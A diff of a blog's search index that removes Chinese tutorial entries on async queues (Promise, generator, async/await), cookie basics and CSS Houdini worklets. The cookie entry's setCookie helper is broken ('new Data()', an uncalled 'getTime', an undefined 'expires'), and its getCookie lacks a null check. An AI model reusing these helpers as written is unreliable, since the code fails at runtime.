@@ -1,51 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>async/await 异步队列 vs Promise 异步队列</title>
-    <url>/2018/11/20/async-await-and-promise/</url>
-    <content><![CDATA[<p>我在上一篇<a href="https://www.xqyoung.com/2018/11/20/promise-async-then-chain/">Promise 异步编程</a>里面，提到了一个面试题：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> timeout = <span class="function"><span class="params">ms</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;, ms);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax1 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">2000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax2 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">1000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ajax3 = <span class="function"><span class="params">()</span> =&gt;</span> timeout(<span class="number">2000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'3'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line"><span class="comment">//todo 补全函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mergePromise([ajax1, ajax2, ajax3]).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(data); <span class="comment">// data 为 [1, 2, 3]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别输出</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// done</span></span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
-<p>实现方法，我用了 promise ：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> p = <span class="built_in">Promise</span>.resolve();</span><br><span class="line">  ajaxArray.forEach(<span class="function">(<span class="params">ajax</span>) =&gt;</span> &#123;</span><br><span class="line">    p = p.then(ajax).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      result.push(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> p.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>为了保持异步队列按顺序调用，我们要维护一条 promise 链，一般就是在函数作用域内生成一个 resolved 的 <code>Promise.resolve()</code>，然后在它后面接上 then 链。于是我们还要分析，then 的回调是不是返回一个异步 resolve 的 promise ？后面需不需要再接上一条 then 的尾巴，以接收异步 resolve 的结果？</p>
-<p>promise 不好读，因为 promise 基本是 try、catch 和 return 之类的语言原语的替代品。</p>
-<p>我用 async/await 改写一下：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span>(<span class="params">ajaxArray</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> ajaxArray) &#123;</span><br><span class="line">      <span class="keyword">let</span> data = <span class="keyword">await</span> fn();</span><br><span class="line">      result.push(data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> run().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在循环里面，我们可以像写同步代码一样写异步代码，await 一个异步结果。</p>
-<h3 id="generator-函数"><a href="#generator-函数" class="headerlink" title="generator 函数"></a>generator 函数</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function*" target="_blank" rel="noopener">生成器函数</a>在执行时能暂停，后面又能从暂停处继续执行。</p>
-<p>调用一个生成器函数并不会马上执行它里面的语句，而是返回一个这个生成器的 迭代器 （iterator ）对象。当这个迭代器的 next() 方法被首次（后续）调用时，其内的语句会执行到第一个（后续）出现yield的位置为止，yield 后紧跟迭代器要返回的值。或者如果用的是 yield*（多了个星号），则表示将执行权移交给另一个生成器函数（当前生成器暂停执行）。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">gen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">10</span>;</span><br><span class="line">    y=<span class="keyword">yield</span> <span class="string">'foo'</span>;</span><br><span class="line">    <span class="keyword">yield</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g=gen();</span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行 yield 10，返回 10</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行 yield 'foo'，返回 'foo'</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next(<span class="number">10</span>));<span class="comment">// 将 10 赋给上一条 yield 'foo' 的左值，即执行 y=10，返回 10</span></span><br><span class="line"><span class="built_in">console</span>.log(g.next());<span class="comment">// 执行完毕，value 为 undefined，done 为 true</span></span><br></pre></td></tr></table></figure>
-<p>更多例子查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function*" target="_blank" rel="noopener">MDN 生成器函数</a></p>
-<h4 id="generator-异步队列"><a href="#generator-异步队列" class="headerlink" title="generator 异步队列"></a>generator 异步队列</h4><p>以上面的代码为例，每次调用 <code>g.next()</code> 会走到下一个 yield 语句，对 yield 语句后面对表达式求值，并且返回形如 <code>{value: someValue, done: false}</code> 的对象，我们希望在生成器函数里面可以像写同步代码一样，yield 一个异步结果。那么 yield 应该返回一个 Promise 实例，通过控制 g.next() 的执行，只有在上一个 yield 返回的 promise resolve/reject 之后，才调用 g.next() 走到下一个 yield 语句。</p>
-<p>我们先有一系列的 promise ，它们是要被异步执行的。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> asyncPromise = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(x + <span class="number">1</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">gen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">yield</span> asyncPromise(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">yield</span> asyncPromise(data1);</span><br><span class="line">  <span class="built_in">console</span>.log(data2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">yield</span> asyncPromise(data2);</span><br><span class="line">  <span class="built_in">console</span>.log(data3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后我们需要一个控制函数，它接受 gen 作为函数，控制执行流程。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> carryPromise = <span class="function"><span class="keyword">function</span>(<span class="params">gen</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> g = gen();</span><br><span class="line">    <span class="keyword">const</span> next = <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> ret = g.next(data);</span><br><span class="line">      <span class="comment">// 走到最后一个 yield 语句，最好把最后一个值传递下去</span></span><br><span class="line">      <span class="keyword">if</span> (ret.done) &#123;</span><br><span class="line">        resolve(data);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ret.value 其实是一个 promise</span></span><br><span class="line">      <span class="comment">// 这里为刚刚生成的 promise 注册 then 回调，回调的操作是注册下一个 promise</span></span><br><span class="line">      ret.value.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        next(data);</span><br><span class="line">        <span class="comment">// 上面这句换成</span></span><br><span class="line">        <span class="comment">// return next(data);</span></span><br><span class="line">        <span class="comment">// 结果也是一样的，就和 Promise 链式调用一样了</span></span><br><span class="line">        <span class="comment">// 只不过实现上，更偏向控制 g.next() 的移动，来实现 promise 的注册</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    next();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>看一下执行结果：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">carryPromise(gen).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`end with: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每项输出前间隔 1 s</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// end with 4</span></span><br></pre></td></tr></table></figure>
-<p>用 generator 实现的异步队列，跟 Promise 的 then 链式回调有些相似，一样是在 promise 的 then 回调里面创建新的 promise ，不一样的是，链式回调的 then 回调里面要 return 这个新的 promise，值才会沿着 then 链传递下去。而 generator 赋给了我们从“外部读取异步结果的能力”，例如 <code>const data1 = yield asyncPromise(1);</code> 。</p>
-<h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><p>首先搞清楚，async 关键字后面跟一个函数，await 关键字后面跟一个表达式，表达式应该是一个 Promise 对象或者任何要等待的值。</p>
-<p>当调用一个 async 函数时，会返回一个 Promise 对象。当这个 async 函数返回一个值时，Promise 的 resolve 方法会负责传递这个值；当 async 函数抛出异常时，Promise 的 reject 方法也会传递这个异常值。</p>
-<p>async 函数中可能会有 await 表达式，这会使 async 函数暂停执行，等待表达式中的 Promise 执行完成后才会继续执行 async 函数并返回解决结果。</p>
-<p>更多关于 async function，查看 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">MDN async function</a></p>
-<p>用 async/await 改写 generator 实现的异步队列：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> asyncPromise(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> asyncPromise(data1);</span><br><span class="line">  <span class="built_in">console</span>.log(data2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> asyncPromise(data2);</span><br><span class="line">  <span class="built_in">console</span>.log(data3);</span><br><span class="line">  <span class="keyword">return</span> data3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = fn().then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`end with <span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>async function 的返回值将被隐式地传递给 Promise.resolve。</p>
-<blockquote>
-<p>参考文章 </p>
-<p><a href="https://pouchdb.com/2015/03/05/taming-the-async-beast-with-es7.html" target="_blank" rel="noopener">Taming the asynchronous beast with ES7</a></p>
-<p><a href="https://juejin.im/post/59cce36751882501c14db49c" target="_blank" rel="noopener">JavaScript 异步队列实现及拓展</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>js 基础</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>异步编程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>同步渲染和异步渲染对 DOM 的阻塞</title>
     <url>/2018/11/19/async-render/</url>
     <content><![CDATA[<p>首先区分一下，什么是同步渲染和异步渲染。</p>
@@ -195,124 +150,6 @@
       </tags>
   </entry>
   <entry>
-    <title>cookie 基础概念</title>
-    <url>/2018/11/20/cookie-base-concept/</url>
-    <content><![CDATA[<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>我们常说的 cookie ，也称为 HTTP Cookie ，它其实是 HTTP 头部中的一段信息，记录客户端和服务器端的交互中的一些信息。它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>
-<h3 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h3><p><a href="https://tools.ietf.org/html/rfc6265#section-4.1" target="_blank" rel="noopener">RFC 6265</a> 规定，服务端可以在 HTTP 响应头部设置 cookie。格式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie&gt;</span><br></pre></td></tr></table></figure>
-<p>cookie 以一对键-值对开始，后面跟着若干属性-值对。属性的详细信息查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener">MDN Set-Cookie</a>。</p>
-<table>
-<thead>
-<tr>
-<th>Attribute</th>
-<th>value</th>
-<th>detail</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Expires</td>
-<td>符合 HTTP-date 规范的时间戳</td>
-<td>若不设置，说明这是一个会话期 cookie</td>
-</tr>
-<tr>
-<td>Max-Age</td>
-<td>cookie 存活的时间，单位是秒。</td>
-<td>优先级比 Expires 高</td>
-</tr>
-<tr>
-<td>Domain</td>
-<td>cookie 可以送达的主机名</td>
-<td>假如没有指定，那么默认值为当前文档访问地址中的主机部分（但是不包含子域名）</td>
-</tr>
-<tr>
-<td>Path</td>
-<td>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送 Cookie 首部</td>
-<td>字符  %x2F (“/“) 可以解释为文件目录分隔符，此目录的下级目录也满足匹配的条件（例如，如果 path=/docs，那么 “/docs”, “/docs/Web/“ 或者 “/docs/Web/HTTP” 都满足匹配的条件）。如果没有设置这个值，用户代理会默认使用 HTTP 请求 URI 的 path</td>
-</tr>
-<tr>
-<td>Secure</td>
-<td>只有在浏览器认为当前通道是“安全”的，才会把带有 Secure 选项的 cookie 发送到服务端</td>
-<td>浏览器认为的安全，通常是在 HTTPS 下</td>
-</tr>
-<tr>
-<td>HttpOnly</td>
-<td>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）</td>
-</tr>
-</tbody>
-</table>
-<p>一个 Set-Cookie 首部字段，只能设置一个 cookie，如果要设置多个 cookie ，直接用多个 Set-Cookie 字段。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie:&lt;cookie1&gt;</span><br><span class="line">Set-Cookie:&lt;cookie2&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="cookie的读写"><a href="#cookie的读写" class="headerlink" title="cookie的读写"></a>cookie的读写</h3><p>原生 node 的 res.setHeader 和 res.writeHead ，如果直接对 Set-Cookie 赋值，会出现覆盖的情况。其实也好理解，对对象的某个属性重复写入值，只有最后一个会保留。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">res.setHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"yang=ozz; Max-Age=500"</span>);</span><br></pre></td></tr></table></figure>
-<p>要在 HTTP 头部加入多个 Set-Cookie 字段，需要对响应流拼接多个 Set-Cookie 选项。为了节省时间，这里用 express 。</p>
-<p>设置以下 cookie</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
-<p>通过 document.cookie 或直接在浏览器 Application 面板中，可以直接访问，修改 cookie 。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie // &quot;yan=eee; agg=sss&quot;</span><br><span class="line">document.cookie = &quot;yan=www&quot;;</span><br><span class="line">document.cookie // &quot;agg=sss; yan=www&quot;</span><br></pre></td></tr></table></figure>
-<p>document.cookie 修改 cookie 只能一个个修改，格式和 Set-Cookie 一样。没有指定修改的属性保持不变，修改的值便覆盖原来的值。</p>
-<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>HttpOnly 只能由服务端设置，本地的设置不会生效。而且设置了 HTTPOnly 的 cookie 无法通过 document.cookie 访问。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: yan=eee; Max-Age=600; Path=/; Expires=Invalid Date; HttpOnly</span><br><span class="line">Set-Cookie: agg=sss; Max-Age=600; Path=/; Expires=Invalid Date</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie // &quot;agg=sss&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="cookie-删改"><a href="#cookie-删改" class="headerlink" title="cookie 删改"></a>cookie 删改</h3><p>修改 cookie</p>
-<p>要想修改一个cookie，只需要重新赋值就行，旧的值会被新的值覆盖。但要注意一点，在设置新cookie时，path/domain这几个选项一定要旧cookie 保持一样。否则不会修改旧值，而是添加了一个新的 cookie。</p>
-<p>删除 cookie</p>
-<p>删除一个cookie 也挺简单，也是重新赋值，只要将这个新cookie的expires 选项设置为一个过去的时间点就行了。但同样要注意，path/domain/这几个选项一定要旧cookie 保持一样。</p>
-<p>原生的 cookie 的读写接口都不太友好，一般需要封装方法。</p>
-<ul>
-<li>读取 cookie</li>
-</ul>
-<p>document.cookie 的结果是一串字符串，是以“; ”分隔开的 cookie 键值对。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="built_in">document</span>.cookie.match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^| )"</span> + name + <span class="string">"=([^;]*)(;|$)"</span>));</span><br><span class="line">    <span class="comment">// 第二个捕获组就是 key=value; 的 value</span></span><br><span class="line">    <span class="keyword">return</span> ary[<span class="number">2</span>] ? ary[<span class="number">2</span>] : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCookie(<span class="string">'agg'</span>);</span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// options</span></span><br><span class="line"><span class="comment">// |-- expires  自设置起过期秒数</span></span><br><span class="line"><span class="comment">// |-- callback 设置成功后回调</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, options</span>) </span>&#123;</span><br><span class="line">    options = options ? options : &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> exp = <span class="keyword">new</span> Data();</span><br><span class="line">    <span class="keyword">var</span> expire = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (options.expires) &#123;</span><br><span class="line">        exp.setTime(exp.getTime + expires * <span class="number">1000</span>);</span><br><span class="line">        expire = exp.toGMTString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + <span class="built_in">escape</span>(value) + <span class="string">";path=/;expires="</span> + expire;</span><br><span class="line">    options.callback &amp;&amp; options.callback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>客户端储存</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSS Houdini</title>
-    <url>/2018/11/21/css-Houdini/</url>
-    <content><![CDATA[<p>借用<a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">谷歌开发者文档</a>的比喻，CSS Houdini 允许你自己当一名魔术师——传统流程中，你改变了 css 的一个样式，可能整个页面的样式都大变样，但是你只能看着浏览器呈现这场魔法盛宴，自己无法参与。CSS Houdini 赋予了你魔术师的本领，你也可以参与浏览器处理样式和布局的流程。</p>
-<p>Houdini 是 W3C 新成立的一个任务小组，它的终极目标是实现 css 属性的完全兼容。Houdini 提出了一个前无古人的的设想：开放 CSS 的 API 给开发者，开发者可以通过这套接口自行扩展 CSS，并提供相应的工具允许开发者介入浏览器渲染引擎的样式和布局流程中。</p>
-<h3 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h3><h4 id="Worklets"><a href="#Worklets" class="headerlink" title="Worklets"></a>Worklets</h4><p>此规范定义了一个 API ，规范了渲染流程中的各个阶段运行的独立于主 javascript 执行环境的脚本。Worklets 的概念和 Web Worker 相似，它们允许你引入脚本文件并执行特定的 JS 代码。Worklets 和 Web Worker 有很多概念上的重叠，那么搞出一个 Worklets 是否多此一举？</p>
-<p>Worklets ，后缀 <code>-let</code> 已经表面了它的特性“小”。存在这种可能：脚本中某些代码片段，在每一帧都要跑一次。Web Worker 其实比较笨重，并不鼓励大量使用。举个例子，为一张四百万像素的图片的每一个像素启用一个 Web Worker 将是不妥当的。</p>
-<p>Worklets 定义了一个方法集合，这些方法的特性由 Worklets 的类型预定义了，开发者所能执行的操作类型被限定，这样就保证了性能。</p>
-<h4 id="CSS-Paint-API"><a href="#CSS-Paint-API" class="headerlink" title="CSS Paint API"></a>CSS Paint API</h4><p>Paint API 在 Chrome 65 默认开启支持，它也被称为 “Houdini’s paint worklet”，它允许 Web 开发人员使用 JavaScript 自定义 CSS <code>image</code>（背景，边框，内容），自定义的 <code>image</code> 会响应样式和尺寸的变化。 </p>
-<p>下面是<a href="https://developers.google.com/web/updates/2018/01/paintapi" target="_blank" rel="noopener">谷歌开发者文档</a>给的一个例子。</p>
-<p>在 Worklets 脚本文件中，先定义一个 CheckerboardPainter 的类，里面规定了画棋盘的方法。然后用 <code>registerPaint</code> 方法注册一个 paint worklet 类。这个 paint worklet 名为 checkerboard 。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// checkerboard.js</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckerboardPainter</span> </span>&#123;</span><br><span class="line">  paint(ctx, geom, properties) &#123;</span><br><span class="line">    <span class="comment">// Use `ctx` as if it was a normal canvas</span></span><br><span class="line">    <span class="keyword">const</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>];</span><br><span class="line">    <span class="keyword">const</span> size = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; geom.height/size; y++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; geom.width/size; x++) &#123;</span><br><span class="line">        <span class="keyword">const</span> color = colors[(x + y) % colors.length];</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.fillStyle = color;</span><br><span class="line">        ctx.rect(x * size, y * size, size, size);</span><br><span class="line">        ctx.fill();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register our class under a specific name</span></span><br><span class="line">registerPaint(<span class="string">'checkerboard'</span>, CheckerboardPainter);</span><br></pre></td></tr></table></figure>
-<p>在主 javaScript 环境中，用 <code>CSS.paintWorklet.addModule(&#39;checkerboard.js&#39;)</code> 加载这个 paint worklet ，然后在 css 属性值里面，可以调用 <code>paint(checkerboard)</code> ，就可以定义自己要的 css 背景/边框/内容 效果。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- index.html --&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  textarea &#123;</span><br><span class="line">    background-image: paint(checkerboard);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">&lt;textarea&gt;&lt;/</span>textarea&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  CSS.paintWorklet.addModule(<span class="string">'checkerboard.js'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p><a href="https://googlechromelabs.github.io/houdini-samples/paint-worklet/checkerboard/" target="_blank" rel="noopener">在线 demo</a></p>
-<h4 id="Animation-Worklet"><a href="#Animation-Worklet" class="headerlink" title="Animation Worklet"></a>Animation Worklet</h4><p>Animation Worklet 是 Compositor Worklet 演化而来的。详细的资料看<a href="https://dassur.ma/things/animworklet/" target="_blank" rel="noopener">这里</a>。</p>
-<p>Compositor Worklet 允许开发者书写在合成器线程（compositor thread）。这将保证代码在每一帧运行，并且开启了一些新的可能性，例如强制实现一些和不是绑定在时间上的动画，比如输入或滚动位置。</p>
-<p>如果合成器线程阻塞了——因为代码计算量太大或者低效——那么整个页面将无法响应，动画也会卡住。</p>
-<p>Animation Worklet 不运行在合成器线程“上”，而是在“尽力而为”的基础上与它同步运行。这意味着，如果你在你的 worklet 中堵塞了，动画允许“溜走”。</p>
-<p>预计 Chrome 71 首次尝试支持 Animation Worklet，我写这篇文的时候，Chrome 71还未发布。Animation Worklet 的例子可以看<a href="https://developers.google.com/web/updates/2018/10/animation-worklet" target="_blank" rel="noopener"><br>Houdini’s Animation Worklet</a>。有 <a href="https://github.com/web-animations/web-animations-js" target="_blank" rel="noopener">polyfill</a> 提供一样的 API，但不提供一样的性能。</p>
-<h4 id="Layout-Worklet"><a href="#Layout-Worklet" class="headerlink" title="Layout Worklet"></a>Layout Worklet</h4><p>开发者可以自己定义一个布局，自定义盒子内元素的布局，然后用类似 <code>display: layout(myLayout)</code> 这样的规则应用自己的布局。这样的好处是：一方面当有新的布局出现的时候可以借助这个 API 进行 polyfill 就不用担心没有实现的浏览器不兼容，另一方面可以发挥想象力实现自己想要的布局，这样在布局上可能会百花齐放了，而不仅仅使用W3C给的那几种布局。</p>
-<h4 id="Typed-CSSOM"><a href="#Typed-CSSOM" class="headerlink" title="Typed CSSOM"></a>Typed CSSOM</h4><p>在 js 中修改一个 css 属性，可谓要翻山越岭：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#someDiv'</span>).style.height = getRandomInt() + <span class="string">'px'</span>;</span><br></pre></td></tr></table></figure>
-<p>我们做了数学计算，把一个数字转成字符串并附加一个单位，浏览器再解析这个字符串，得到一个数字，再把这个数字交回给 CSS 引擎。</p>
-<p>有了类型化 CSS 对象模型，我们可以基于 StylePropertyMap 操作元素。</p>
